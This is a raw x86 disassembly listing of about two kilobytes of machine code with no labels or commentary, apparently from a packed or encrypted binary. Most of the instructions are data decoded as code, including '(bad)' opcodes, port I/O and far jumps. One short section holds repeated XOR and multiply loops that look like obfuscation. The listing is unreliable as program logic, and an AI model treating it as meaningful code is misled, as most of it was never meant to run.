  411785:	cmp    esp,DWORD PTR [eax-0x724ba937]
  41178b:	push   es
  41178c:	bound  esp,QWORD PTR [edx-0x449e946b]
  411792:	retf   0xdf0d
  411795:	jo     0x411759
  411797:	aaa    
  411798:	mov    cl,0x95
  41179a:	je     0x4117ac
  41179c:	pop    ecx
  41179d:	aam    0xc7
  41179f:	mov    cl,0x8f
  4117a1:	ret    
  4117a2:	jp     0x411785
  4117a4:	loop   0x411792
  4117a6:	loopne 0x4117bb
  4117a8:	leave  
  4117a9:	and    eax,0x51a78a8
  4117ae:	and    BYTE PTR [ebx],cl
  4117b0:	dec    edi
  4117b1:	sub    eax,0xef598182
  4117b6:	xor    ecx,eax
  4117b8:	xchg   edx,eax
  4117b9:	test   DWORD PTR [esi-0x30e79e8b],edx
  4117bf:	retf   0xf7f2
  4117c2:	aam    0xb8
  4117c4:	lods   eax,DWORD PTR ds:[esi]
  4117c5:	sub    ebx,DWORD PTR ds:0x104086e6
  4117cb:	stc    
  4117cc:	mov    esi,0xb6c6e220
  4117d1:	out    dx,al
  4117d2:	jg     0x411852
  4117d4:	jnp    0x4117e8
  4117d6:	push   ebx
  4117d7:	xchg   bh,al
  4117d9:	outs   dx,BYTE PTR ds:[esi]
  4117da:	mov    ebp,0xd48bb5ec
  4117df:	sub    edi,ebp
  4117e1:	enter  0x4b2,0x19
  4117e5:	mov    cl,0x81
  4117e7:	in     al,0xdf
  4117e9:	lea    ebx,[edx-0x67f37f18]
  4117ef:	loope  0x411797
  4117f1:	jae    0x411785
  4117f3:	push   esp
  4117f4:	xlat   BYTE PTR ds:[ebx]
  4117f5:	shl    DWORD PTR [eax-0x4f],cl
  4117f8:	dec    ecx
  4117f9:	jns    0x411872
  4117fb:	fs ss js 0x4117fb
  4117ff:	test   BYTE PTR [edi+edx*4],ah
  411802:	in     al,0x32
  411804:	inc    esi
  411805:	loope  0x411841
  411807:	mov    al,0x90
  411809:	jae    0x4117df
  41180b:	shl    BYTE PTR [edi+0x59d00404],cl
  411811:	adc    BYTE PTR [ecx+0x79a0e00f],al
  411817:	cmp    ch,dh
  411819:	pusha  
  41181a:	test   BYTE PTR [edi+0x2d3a7eb6],cl
  411820:	sub    DWORD PTR [ecx+eax*2],esi
  411823:	outs   dx,DWORD PTR ds:[esi]
  411824:	sbb    eax,0x9d5c7091
  411829:	dec    edi
  41182a:	jbe    0x411840
  41182c:	pop    es
  41182d:	retf   0x39a4
  411830:	jge    0x4117ff
  411832:	and    DWORD PTR [ecx],ebx
  411834:	jmp    0xd7216f6
  411839:	out    dx,eax
  41183a:	xor    eax,0x8734213a
  41183f:	cmc    
  411840:	test   eax,0xc93105e9
  411845:	sub    DWORD PTR [ecx-0x76],esp
  411848:	je     0x41189f
  41184a:	fcom   QWORD PTR [edi+0x70]
  41184d:	mov    al,0x10
  41184f:	loope  0x411858
  411851:	inc    ebp
  411852:	into   
  411853:	sahf   
  411854:	popa   
  411855:	mov    DWORD PTR [edx-0x2bda3ab],ecx
  41185b:	xchg   edx,eax
  41185c:	inc    esi
  41185d:	stc    
  41185e:	popa   
  41185f:	mov    ds:0x6a260d3,al
  411864:	push   ds
  411865:	pusha  
  411866:	lods   eax,DWORD PTR ds:[esi]
  411867:	pop    es
  411868:	ret    0x11b0
  41186b:	push   ebx
  41186c:	ror    BYTE PTR [edi+esi*4+0x4796e1aa],cl
  411873:	inc    ecx
  411874:	(bad)  
  411875:	pushf  
  411876:	sbb    al,0x4a
  411878:	fcos   
  41187a:	aad    0x28
  41187c:	out    dx,eax
  41187d:	jl     0x411851
  41187f:	jg     0x4118e7
  411881:	mov    bl,0xf4
  411883:	sbb    bl,BYTE PTR [edx]
  411885:	xchg   ebp,eax
  411886:	add    DWORD PTR [ebp+edx*2+0x5d],ecx
  41188a:	mov    eax,0x717bc2e3
  41188f:	xchg   edx,eax
  411890:	mov    ecx,0x29631de8
  411895:	aas    
  411896:	adc    al,0x4b
  411898:	and    ch,bh
  41189a:	lock int3 
  41189c:	adc    eax,0x4a176b14
  4118a1:	retf   0xee39
  4118a4:	push   edi
  4118a5:	sub    eax,0x2c0a0ae5
  4118aa:	adc    cl,ah
  4118ac:	push   esp
  4118ad:	leave  
  4118ae:	adc    al,0x5e
  4118b0:	fwait
  4118b1:	jmp    0x411920
  4118b3:	ins    BYTE PTR es:[edi],dx
  4118b4:	or     al,0x0
  4118b6:	adc    al,0xe4
  4118b8:	mov    al,ds:0x66f0bcc6
  4118bd:	xchg   esi,eax
  4118be:	js     0x4118c8
  4118c0:	gs repz sti 
  4118c3:	cdq    
  4118c4:	imul   esp,DWORD PTR [ebx],0x83437f8
  4118ca:	seto   BYTE PTR [ebx]
  4118cd:	add    BYTE PTR [edi+0x60ba14ab],ah
  4118d3:	or     esp,esp
  4118d5:	mov    eax,0x1b176acf
  4118da:	sbb    al,0x9a
  4118dc:	dec    ecx
  4118dd:	rol    BYTE PTR [eax+0x50],1
  4118e0:	sub    ch,BYTE PTR [edi+ebp*2-0x76b449aa]
  4118e7:	inc    edx
  4118e8:	adc    eax,0x28635538
  4118ed:	out    0x11,al
  4118ef:	jmp    0x4118ef
  4118f1:	mov    ds,WORD PTR [esp+eax*4+0x65]
  4118f5:	or     dl,BYTE PTR [eax-0x518df681]
  4118fb:	hlt    
  4118fc:	gs aas 
  4118fe:	out    0x4b,eax
  411900:	add    BYTE PTR [esi-0x6c14378a],dl
  411906:	dec    eax
  411907:	aam    0x79
  411909:	jle    0x411915
  41190b:	fst    st(1)
  41190d:	fdivr  DWORD PTR [edi+0x33c59ba]
  411913:	into   
  411914:	push   0x4b5e26b4
  411919:	push   ss
  41191a:	dec    esi
  41191b:	pop    ecx
  41191c:	jle    0x411992
  41191e:	add    al,0x7b
  411920:	push   es
  411921:	mov    eax,esp
  411923:	imul   ebp,DWORD PTR [eax+0x2d910156],0xffffffba
  41192a:	ins    DWORD PTR es:[edi],dx
  41192b:	jmp    0x3923:0x6fbadf6c
  411932:	fs fwait
  411934:	push   esi
  411935:	(bad)  
  411937:	and    al,0x2b
  411939:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41193a:	int    0xbe
  41193c:	out    0xc7,eax
  41193e:	dec    ebp
  41193f:	pop    ecx
  411940:	push   esi
  411941:	hlt    
  411942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411943:	sbb    al,0x48
  411945:	pusha  
  411946:	mov    BYTE PTR [ecx+0x5f],cl
  411949:	dec    edi
  41194a:	xlat   BYTE PTR ds:[ebx]
  41194b:	ds repnz pop ebx
  41194e:	dec    edi
  41194f:	imul   eax,DWORD PTR [eax+esi*2-0x507f6757],0xffffffe2
  411957:	mov    esi,DWORD PTR [ebx+0x74]
  41195a:	cmc    
  41195b:	add    al,0xd
  41195d:	addr16 inc edx
  41195f:	cmp    BYTE PTR [edx],ch
  411961:	jno    0x4118f3
  411963:	sahf   
  411964:	dec    edx
  411965:	daa    
  411966:	fwait
  411967:	adc    BYTE PTR [esi+0x4a],ch
  41196a:	ret    0xc454
  41196d:	mov    esp,0x9b0b4f5
  411972:	lods   al,BYTE PTR ds:[esi]
  411973:	xor    edx,ecx
  411975:	fimul  DWORD PTR [ecx-0x80]
  411978:	loope  0x41194f
  41197a:	sub    eax,0x4c1cd314
  41197f:	push   cs
  411980:	in     eax,dx
  411981:	and    bl,BYTE PTR [ecx-0x120b8b5b]
  411987:	pop    ss
  411988:	outs   dx,BYTE PTR ds:[esi]
  411989:	xor    esp,DWORD PTR [esi]
  41198b:	cmp    dh,BYTE PTR ds:0x23c8752d
  411991:	in     eax,0xf7
  411993:	mov    BYTE PTR [edx-0x6e],dl
  411996:	test   eax,0xbfdc9687
  41199b:	xchg   esi,eax
  41199c:	and    al,0xfe
  41199e:	add    dh,BYTE PTR [edi+0x7f]
  4119a1:	sub    bh,BYTE PTR [ecx]
  4119a3:	xor    DWORD PTR [ecx+eiz*8-0x2e],edi
  4119a7:	aad    0x75
  4119a9:	add    al,0x1d
  4119ab:	push   esp
  4119ac:	adc    al,0x3b
  4119ae:	push   ebp
  4119af:	mov    DWORD PTR [edi],esi
  4119b1:	cmp    esi,ebx
  4119b3:	cmp    dh,ch
  4119b5:	pop    edx
  4119b6:	js     0x4119a4
  4119b8:	inc    esp
  4119b9:	push   es
  4119ba:	xor    DWORD PTR [ecx+0x38],0x7fdcdf8f
  4119c1:	add    DWORD PTR [esi-0x53],eax
  4119c4:	popa   
  4119c5:	hlt    
  4119c6:	pusha  
  4119c7:	pusha  
  4119c8:	sub    ebx,DWORD PTR [ebp+0x3fc340bc]
  4119ce:	pop    edi
  4119cf:	icebp  
  4119d0:	dec    BYTE PTR [ecx+0x7e]
  4119d3:	push   eax
  4119d4:	push   0x38d48bc5
  4119d9:	jno    0x4119f0
  4119db:	or     al,0x95
  4119dd:	jp     0x4119ac
  4119df:	imul   ebp,ecx,0x4b7a5962
  4119e5:	ja     0x4119b6
  4119e7:	dec    edi
  4119e8:	xchg   ebx,eax
  4119e9:	sbb    DWORD PTR [ebp+0x17],edi
  4119ec:	cwde   
  4119ed:	imul   esi,DWORD PTR [ecx-0x37],0xffffffd3
  4119f1:	cmp    eax,ecx
  4119f3:	int    0x4c
  4119f5:	inc    edi
  4119f6:	dec    ecx
  4119f7:	or     ebx,0x144af64f
  4119fd:	out    0xce,eax
  4119ff:	pop    ebx
  411a00:	jmp    0x4fe3:0x78d4fbea
  411a07:	adc    dl,dl
  411a09:	mov    eax,ds:0xfffa2213
  411a0e:	(bad)  
  411a0f:	shr    BYTE PTR [edx-0x30],1
  411a12:	es sbb eax,0x1af9e722
  411a18:	ficom  WORD PTR [edx]
  411a1a:	mov    dh,0xe1
  411a1c:	xlat   BYTE PTR ds:[ebx]
  411a1d:	test   al,0xa2
  411a1f:	mov    bl,cl
  411a21:	jnp    0x4119ea
  411a23:	mul    DWORD PTR [ebx+0x583d1330]
  411a29:	call   0xcedac0c8
  411a2e:	popf   
  411a2f:	scas   al,BYTE PTR es:[edi]
  411a30:	mov    eax,0xe5141fe9
  411a35:	xchg   edi,eax
  411a36:	not    DWORD PTR [ebp+0x39fc879d]
  411a3c:	pop    esp
  411a3d:	mov    cl,0x0
  411a3f:	in     eax,dx
  411a40:	mov    bl,0x9b
  411a42:	xchg   DWORD PTR [ebx],esi
  411a44:	inc    eax
  411a45:	cmp    eax,0x95e7c4d7
  411a4a:	add    ax,0x97ec
  411a4e:	xor    al,0xe4
  411a50:	cmp    BYTE PTR [edx-0x4d],dh
  411a53:	fmul   st,st(4)
  411a55:	ins    DWORD PTR es:[edi],dx
  411a56:	pusha  
  411a57:	popa   
  411a58:	lods   eax,DWORD PTR ds:[esi]
  411a59:	test   BYTE PTR [ebx+eiz*1-0x4677d91f],ah
  411a60:	int    0xc5
  411a62:	es adc cl,0x53
  411a66:	lea    esi,[esi+0x4e]
  411a69:	dec    eax
  411a6a:	retf   
  411a6b:	sbb    ebp,DWORD PTR [ebx]
  411a6d:	push   es
  411a6e:	(bad)  
  411a6f:	and    ecx,DWORD PTR [ebx]
  411a71:	enter  0x6e74,0x77
  411a75:	stos   DWORD PTR es:[edi],eax
  411a76:	aas    
  411a77:	rol    DWORD PTR [edx],0x88
  411a7a:	mov    ch,al
  411a7c:	inc    edx
  411a7d:	xchg   edi,eax
  411a7e:	jbe    0x411a69
  411a80:	stos   BYTE PTR es:[edi],al
  411a81:	xchg   ebx,eax
  411a82:	mov    esi,0x606f371a
  411a87:	rcr    eax,cl
  411a89:	push   0xf36d63c1
  411a8e:	in     al,0xc
  411a90:	icebp  
  411a91:	push   ebp
  411a92:	mov    eax,ds:0xeef2ac69
  411a97:	jge    0x411a73
  411a99:	pop    edi
  411a9a:	loope  0x411a65
  411a9c:	inc    ebp
  411a9d:	dec    edx
  411a9e:	sbb    DWORD PTR [edx],edi
  411aa0:	xchg   ebp,eax
  411aa1:	call   esi
  411aa3:	jecxz  0x411ae5
  411aa5:	push   esi
  411aa6:	add    eax,0x8b1ea083
  411aab:	push   ebp
  411aac:	call   0xd644eae4
  411ab1:	cmp    ecx,edx
  411ab3:	mov    ecx,DWORD PTR [ebp-0x14]
  411ab6:	mov    DWORD PTR [ebp+0x8],ecx
  411ab9:	mov    ecx,DWORD PTR [ebp+0x8]
  411abc:	je     0x4164f7
  411ac2:	xor    ecx,eax
  411ac4:	add    ecx,esi
  411ac6:	mov    ecx,0x242ebe9
  411acb:	je     0x411bdb
  411ad1:	mov    edx,DWORD PTR [ebp+0x8]
  411ad4:	mov    ebx,DWORD PTR [ebp-0x8]
  411ad7:	xor    edx,eax
  411ad9:	xor    ebx,eax
  411adb:	sub    edx,ebx
  411add:	sub    edx,esi
  411adf:	xor    edx,eax
  411ae1:	mov    DWORD PTR [ebp+0x8],edx
  411ae4:	mov    edx,DWORD PTR [ebp+0x8]
  411ae7:	mov    ebx,DWORD PTR [ebp-0x58]
  411aea:	add    edx,0x5708c4
  411af0:	imul   edx,ebx
  411af3:	mov    DWORD PTR [ebp-0x58],edx
  411af6:	mov    edx,DWORD PTR [ebp+0x8]
  411af9:	mov    ebx,DWORD PTR [ebp-0x54]
  411afc:	add    edx,0x64f8da
  411b02:	or     edx,ebx
  411b04:	mov    DWORD PTR [ebp-0x54],edx
  411b07:	mov    edx,DWORD PTR [ebp+0x8]
  411b0a:	mov    ebx,DWORD PTR [ebp-0x50]
  411b0d:	add    edx,ecx
  411b0f:	xor    edx,ebx
  411b11:	mov    DWORD PTR [ebp-0x50],edx
  411b14:	mov    edx,DWORD PTR [ebp+0x8]
  411b17:	mov    ebx,DWORD PTR [ebp-0x4c]
  411b1a:	add    edx,edi
  411b1c:	and    edx,ebx
  411b1e:	mov    DWORD PTR [ebp-0x4c],edx
  411b21:	mov    edx,DWORD PTR [ebp+0x8]
  411b24:	mov    ebx,DWORD PTR [ebp-0x48]
  411b27:	lea    edx,[ebx+edx*1+0x241fc1f]
  411b2e:	mov    DWORD PTR [ebp-0x48],edx
  411b31:	mov    edx,DWORD PTR [ebp+0x8]
  411b34:	mov    ebx,0xfa5e15e2
  411b39:	sub    ebx,edx
  411b3b:	add    ebx,DWORD PTR [ebp-0x44]
  411b3e:	mov    DWORD PTR [ebp-0x44],ebx
  411b41:	mov    edx,DWORD PTR [ebp+0x8]
  411b44:	xor    edx,eax
  411b46:	add    edx,esi
  411b48:	jne    0x411ad1
  411b4e:	jmp    0x411bdb
  411b53:	mov    edx,DWORD PTR [ebp-0x14]
  411b56:	mov    DWORD PTR [ebp+0x8],edx
  411b59:	jmp    0x411bce
  411b5e:	mov    edx,DWORD PTR [ebp+0x8]
  411b61:	mov    ebx,DWORD PTR [ebp-0x8]
  411b64:	xor    edx,eax
  411b66:	xor    ebx,eax
  411b68:	sub    edx,ebx
  411b6a:	sub    edx,esi
  411b6c:	xor    edx,eax
  411b6e:	mov    DWORD PTR [ebp+0x8],edx
  411b71:	mov    edx,DWORD PTR [ebp+0x8]
  411b74:	mov    ebx,DWORD PTR [ebp-0x58]
  411b77:	add    edx,0x5708c4
  411b7d:	imul   edx,ebx
  411b80:	mov    DWORD PTR [ebp-0x58],edx
  411b83:	mov    edx,DWORD PTR [ebp+0x8]
  411b86:	mov    ebx,DWORD PTR [ebp-0x54]
  411b89:	add    edx,0x64f8da
  411b8f:	or     edx,ebx
  411b91:	mov    DWORD PTR [ebp-0x54],edx
  411b94:	mov    edx,DWORD PTR [ebp+0x8]
  411b97:	mov    ebx,DWORD PTR [ebp-0x50]
  411b9a:	add    edx,ecx
  411b9c:	xor    edx,ebx
  411b9e:	mov    DWORD PTR [ebp-0x50],edx
  411ba1:	mov    edx,DWORD PTR [ebp+0x8]
  411ba4:	mov    ebx,DWORD PTR [ebp-0x4c]
  411ba7:	add    edx,edi
  411ba9:	and    edx,ebx
  411bab:	mov    DWORD PTR [ebp-0x4c],edx
  411bae:	mov    edx,DWORD PTR [ebp+0x8]
  411bb1:	mov    ebx,DWORD PTR [ebp-0x48]
  411bb4:	lea    edx,[ebx+edx*1+0x241fc1f]
  411bbb:	mov    DWORD PTR [ebp-0x48],edx
  411bbe:	mov    edx,DWORD PTR [ebp+0x8]
  411bc1:	mov    ebx,0xfa5e15e2
  411bc6:	sub    ebx,edx
  411bc8:	add    ebx,DWORD PTR [ebp-0x44]
  411bcb:	mov    DWORD PTR [ebp-0x44],ebx
  411bce:	mov    edx,DWORD PTR [ebp+0x8]
  411bd1:	xor    edx,eax
  411bd3:	add    edx,esi
  411bd5:	jne    0x411b5e
  411bdb:	mov    edx,DWORD PTR [ebp-0x14]
  411bde:	mov    DWORD PTR [ebp+0x8],edx
  411be1:	jmp    0x4163be
  411be6:	jmp    0x413f9a
  411beb:	rcr    BYTE PTR [ecx-0x6f],1
  411bee:	and    BYTE PTR [ecx+0x70],dh
  411bf1:	ror    DWORD PTR [ecx+0x1e6f5998],1
  411bf7:	pop    es
  411bf8:	inc    ebx
  411bf9:	jno    0x411bac
  411bfb:	dec    ebx
  411bfc:	test   eax,0x5feb7c7c
  411c01:	jl     0x411c7f
  411c03:	jp     0x411be0
  411c05:	or     ch,BYTE PTR [ebx]
  411c07:	sub    eax,0x5dc30acb
  411c0c:	sahf   
  411c0d:	imul   ecx,DWORD PTR [edi-0x713d8a0c],0xffffffff
  411c14:	and    al,0xe8
  411c16:	add    al,0xee
  411c18:	sbb    ah,ch
  411c1a:	xor    esp,esi
  411c1c:	pop    esp
  411c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c1e:	or     ch,BYTE PTR [ebx]
  411c20:	adc    edx,esp
  411c22:	loopne 0x411c45
  411c24:	sub    ah,dl
  411c26:	or     al,0xf0
  411c28:	inc    eax
  411c29:	and    DWORD PTR [esi],0xe265b759
  411c2f:	inc    eax
  411c30:	out    0x36,eax
  411c32:	push   0xffffffea
  411c34:	jns    0x411c10
  411c36:	xor    dl,BYTE PTR [edx]
  411c38:	out    0x7a,ax
  411c3b:	mov    esp,0x17108d19
  411c40:	adc    al,0x67
  411c42:	lods   al,BYTE PTR ds:[esi]
  411c43:	fstp   QWORD PTR [edi+0x9fbf952]
  411c49:	mov    bl,0x6f
  411c4b:	jns    0x411c88
  411c4d:	adc    eax,0xb05717fc
  411c52:	sub    ebp,DWORD PTR [edi]
  411c54:	scas   al,BYTE PTR es:[edi]
  411c55:	js     0x411c9a
  411c57:	in     eax,0x16
  411c59:	lods   eax,DWORD PTR ds:[esi]
  411c5a:	sub    DWORD PTR [esi+0x45],esi
  411c5d:	leave  
  411c5e:	mov    edx,0x8357e4b2
  411c63:	and    edx,DWORD PTR [edx+0x34]
  411c66:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c67:	dec    edi
  411c68:	mov    ecx,0xd6594a19
  411c6d:	pop    ds
  411c6e:	mov    al,0x56
  411c70:	lods   eax,DWORD PTR ds:[esi]
  411c71:	mov    esi,0xdddb7bd3
  411c76:	fcmovnb st,st(4)
  411c78:	aaa    
  411c79:	add    BYTE PTR [edx-0x5b243b88],bh
  411c7f:	mov    dh,0x2b
  411c81:	fild   WORD PTR [ebx+0x3f0af68c]
  411c87:	cwde   
  411c88:	sub    edi,ebp
  411c8a:	nop
  411c8b:	enter  0x6abd,0x15
  411c8f:	inc    eax
  411c90:	jmp    DWORD PTR [ecx]
  411c92:	add    ah,BYTE PTR [ebx-0x75975121]
  411c98:	outs   dx,DWORD PTR ds:[esi]
  411c99:	push   ds
  411c9a:	xchg   ebp,eax
  411c9b:	test   BYTE PTR [eax],bl
  411c9d:	xor    edx,ebx
  411c9f:	sub    edx,esi
  411ca1:	daa    
  411ca2:	stos   DWORD PTR es:[edi],eax
  411ca3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ca4:	jns    0x411c81
  411ca6:	ret    0xd146
  411ca9:	les    esi,FWORD PTR [esi]
  411cab:	pop    ss
  411cac:	xor    bl,BYTE PTR [ebx-0x30]
  411caf:	inc    esp
  411cb0:	pop    es
  411cb1:	pop    ss
  411cb2:	sbb    cl,al
  411cb4:	jmp    0x411c8e
  411cb6:	aam    0x1f
  411cb8:	cmp    al,0x3e
  411cba:	inc    eax
  411cbb:	xchg   edx,eax
  411cbc:	add    ebp,eax
  411cbe:	mov    ebp,ecx
  411cc0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cc1:	shl    ah,1
  411cc3:	fisttp QWORD PTR [ecx-0x4421c035]
  411cc9:	loopne 0x411cf5
  411ccb:	inc    edx
  411ccc:	and    DWORD PTR [ebx+eiz*2-0x5a],esi
  411cd0:	push   0x8
  411cd2:	mov    ebp,0x90e015bc
  411cd7:	(bad)  es:[ecx+0x2f16f2f6]
  411cde:	dec    ebp
  411cdf:	xchg   ecx,eax
  411ce0:	fstp   TBYTE PTR [eax+0x666c49bd]
  411ce6:	or     ecx,DWORD PTR [ecx+0x5b]
  411ce9:	outs   dx,BYTE PTR ds:[esi]
  411cea:	in     al,0x2d
  411cec:	div    DWORD PTR [ebp-0x5c]
  411cef:	cmp    eax,0x54a9e1ab
  411cf4:	xor    al,0x4c
  411cf6:	adc    bh,al
  411cf8:	push   esi
  411cf9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411cfa:	add    esi,DWORD PTR [edx-0xee6aea5]
  411d00:	mov    cl,0xed
  411d02:	sbb    BYTE PTR [edi-0x236b316b],0xcf
  411d09:	loop   0x411cb6
  411d0b:	inc    ebp
  411d0c:	sbb    eax,0xbfef0e53
  411d11:	push   esp
  411d12:	imul   DWORD PTR [esi-0x501cf844]
  411d18:	sub    BYTE PTR ds:0x268c504f,0xa7
  411d1f:	popa   
  411d20:	call   DWORD PTR [ebp-0x571af07d]
  411d26:	mov    ecx,0x2f195ccd
  411d2b:	pop    esi
  411d2c:	xchg   ebx,eax
  411d2d:	ret    
  411d2e:	jb     0x411d8a
  411d30:	adc    edx,edx
  411d32:	lea    edx,[ebx-0x303246f0]
  411d38:	imul   esp,DWORD PTR [ecx],0x2c048887
  411d3e:	sub    al,0x69
  411d40:	test   BYTE PTR [esi],ch
  411d42:	add    eax,0xe4889ab3
  411d47:	jno    0x411cd1
  411d49:	dec    ecx
  411d4a:	pop    ss
  411d4b:	mov    WORD PTR [esi+0x3d],cs
  411d4e:	dec    esp
  411d4f:	xchg   edx,eax
  411d50:	sar    BYTE PTR [edx+0x7f17ba63],cl
  411d56:	mov    bl,0x40
  411d58:	jecxz  0x411d48
  411d5a:	mov    ecx,0xdb546b7e
  411d5f:	mov    bl,0x87
  411d61:	inc    esi
  411d62:	mov    bl,0x61
  411d64:	inc    dx
  411d66:	xchg   ebp,eax
  411d67:	push   0x6950ef06
  411d6c:	pushf  
  411d6d:	hlt    
  411d6e:	sti    
  411d6f:	mov    dh,0x87
  411d71:	mov    eax,ds:0xce063de6
  411d76:	xchg   edi,eax
  411d77:	retf   
  411d78:	xchg   esi,eax
  411d79:	sub    esp,esi
  411d7b:	ins    DWORD PTR es:[edi],dx
  411d7c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411d7d:	fnsave [esi-0x2c616882]
  411d83:	dec    esi
  411d84:	hlt    
  411d85:	popa   
  411d86:	xlat   BYTE PTR ds:[ebx]
  411d87:	jge    0x411da2
  411d89:	push   ss
  411d8a:	cdq    
  411d8b:	pusha  
  411d8c:	imul   ecx,DWORD PTR [ecx-0x695d6bbb],0x40
  411d93:	pop    edx
  411d94:	iret   
  411d95:	int    0xe
  411d97:	or     ebp,edi
  411d99:	popa   
  411d9a:	lods   eax,DWORD PTR ds:[esi]
  411d9b:	imul   eax,DWORD PTR [esi-0x35],0x0
  411d9f:	xchg   esi,eax
  411da0:	sub    DWORD PTR [eax+0x10],edi
  411da3:	jmp    0x2e6d:0x88a13ac3
  411daa:	int3   
  411dab:	shr    bh,0x8d
  411dae:	sbb    al,0xd9
  411db0:	inc    eax
  411db1:	jb     0x411d5c
  411db3:	push   ds
  411db4:	or     ebx,esi
  411db6:	ins    DWORD PTR es:[edi],dx
  411db7:	or     DWORD PTR [edx-0x687c9add],ebp
  411dbd:	xchg   edx,eax
  411dbe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411dbf:	jl     0x411db8
  411dc1:	rcr    DWORD PTR [ebx-0x643de10e],0x32
  411dc8:	in     eax,0x79
  411dca:	fild   QWORD PTR [edi+0x59014331]
  411dd0:	or     al,0xcd
  411dd2:	jno    0x411e20
  411dd4:	adc    BYTE PTR [ecx+0x30],dh
  411dd7:	cmps   DWORD PTR cs:[si],DWORD PTR es:[di]
  411dda:	stos   DWORD PTR es:[edi],eax
  411ddb:	ret    0x71b4
  411dde:	pop    DWORD PTR [eax]
  411de0:	(bad)  
  411de2:	cwde   
  411de3:	rol    DWORD PTR [ecx],0xc2
  411de6:	jno    0x411d99
  411de8:	call   0xfbd7:0xfc37f02
  411def:	adc    esi,0xc532ebe0
  411df5:	and    bh,BYTE PTR [ecx-0x5b]
  411df8:	inc    ecx
  411df9:	or     bl,0x28
  411dfc:	in     al,0x46
  411dfe:	mov    ds,WORD PTR [edi+edx*4+0x76]
  411e02:	sub    bh,cl
  411e04:	xor    ah,BYTE PTR [eax+0x1922a5ce]
  411e0a:	mov    ebp,0x6672401c
  411e0f:	inc    esp
  411e10:	lds    esi,FWORD PTR [edi+ecx*8-0x3b]
  411e14:	mov    bl,0x78
  411e16:	cld    
  411e17:	retf   0x9212
  411e1a:	xor    al,0xfe
  411e1c:	xor    ecx,ecx
  411e1e:	xchg   ebx,eax
  411e1f:	pop    ss
  411e20:	jmp    0x411e46
  411e22:	xchg   edi,eax
  411e23:	inc    esp
  411e24:	sub    BYTE PTR ds:0x1ff0b7ce,cl
  411e2a:	add    ebx,DWORD PTR [ecx]
  411e2c:	push   ss
  411e2d:	mov    ecx,esi
  411e2f:	(bad)  
  411e31:	aad    0xea
  411e33:	adc    eax,0xd4f28777
  411e38:	sub    ebx,esi
  411e3a:	fdivp  st(3),st
  411e3c:	jmp    DWORD PTR gs:[edi-0x5d]
  411e40:	adc    dh,BYTE PTR [edi+0x6f44ccd5]
  411e46:	imul   ebx,DWORD PTR [esi+0x7b],0x5b
  411e4a:	sub    BYTE PTR [esi+eax*4+0x4b],bl
  411e4e:	sbb    dh,BYTE PTR [edx]
  411e50:	inc    ebp
  411e51:	fadd   QWORD PTR [ebx+0x3a]
  411e54:	in     eax,0xbd
  411e56:	repz xor eax,ecx
  411e59:	adc    eax,0x63598bac
  411e5e:	mov    esi,0xdf1466c9
  411e63:	cmp    al,0x78
  411e65:	or     bh,BYTE PTR [esi]
  411e67:	mov    dh,ch
  411e69:	nop
  411e6a:	and    eax,0x3529c428
  411e6f:	sub    eax,ebx
  411e71:	sub    eax,ecx
  411e73:	mov    WORD PTR [ebp+0x32],?
  411e76:	cmp    bl,BYTE PTR [ebx+edx*4+0x558f6aee]
  411e7d:	sub    al,0xe5
  411e7f:	shl    ebx,1
  411e81:	int    0x97
  411e83:	and    BYTE PTR [edi],bh
  411e85:	loop   0x411edd
  411e87:	retf   
  411e88:	jl     0x411e9e
  411e8a:	ins    DWORD PTR es:[edi],dx
  411e8b:	es aam 0xed
  411e8e:	cmp    al,0xc0
  411e90:	inc    eax
  411e91:	shl    DWORD PTR [edx-0x4],0xe
  411e95:	popf   
  411e96:	mov    eax,0xdedd77fe
  411e9b:	aad    0xf4
  411e9d:	and    al,0x7f
  411e9f:	sub    BYTE PTR [esi+0x35],cl
  411ea2:	pop    ss
  411ea3:	and    eax,0xdc10a9ba
  411ea8:	stc    
  411ea9:	dec    edx
  411eaa:	fcmovnu st,st(1)
  411eac:	xor    edi,edx
  411eae:	outs   dx,BYTE PTR ds:[esi]
  411eaf:	push   edx
  411eb0:	pop    edx
  411eb1:	ret    
  411eb2:	push   ds
  411eb3:	dec    esp
  411eb4:	mov    dh,0x5
  411eb6:	or     DWORD PTR [ebx+0x3c7fde01],ebp
  411ebc:	xor    ebp,ebx
  411ebe:	aad    0xba
  411ec0:	cmp    eax,0x8da43c8d
  411ec5:	sub    edi,edi
  411ec7:	call   0x9935bfb9
  411ecc:	mov    esp,0x35e8db2e
  411ed1:	inc    esp
  411ed2:	ins    BYTE PTR es:[edi],dx
  411ed3:	add    esi,eax
  411ed5:	cmp    DWORD PTR ds:0xb8ea90bd,ecx
  411edb:	or     dl,BYTE PTR [esi+0x2f879184]
  411ee1:	ins    DWORD PTR es:[edi],dx
  411ee2:	add    DWORD PTR [ebp+0x4887af9c],0x66
  411ee9:	mov    esi,0xae035265
  411eee:	dec    esi
  411eef:	cs xor al,0xd6
  411ef2:	xlat   BYTE PTR ds:[ebx]
  411ef3:	and    DWORD PTR [ebp-0x24],ecx
  411ef6:	test   cl,dh
  411ef8:	paddusw mm1,mm0
  411efb:	es in  al,dx
  411efd:	jp     0x411e92
  411eff:	int    0x2f
  411f01:	loop   0x411f25
  411f03:	imul   edi,eax,0xffffffdb
  411f06:	pushf  
  411f07:	idiv   BYTE PTR [eax-0x3f2da39b]
  411f0d:	mov    cl,0x43
  411f0f:	imul   ebx,DWORD PTR [ebp+0x62f30ead],0x46
  411f16:	dec    ebx
  411f17:	add    DWORD PTR [esi+0xe],ebp
  411f1a:	outs   dx,BYTE PTR ds:[esi]
  411f1b:	inc    ecx
  411f1c:	mov    ch,0xc3
  411f1e:	inc    ebp
  411f1f:	mov    ah,BYTE PTR [ecx+0x50]
  411f22:	pop    ebx
  411f23:	push   es
  411f24:	int3   
  411f25:	ds sub bh,cl
  411f28:	(bad)  
  411f29:	jmp    0x7e7e8f50
  411f2e:	xor    bh,BYTE PTR [esp+ecx*8+0x48]
  411f32:	mov    ecx,0x40509187
  411f37:	push   cs
  411f38:	test   DWORD PTR [edx+0x5d],ebp
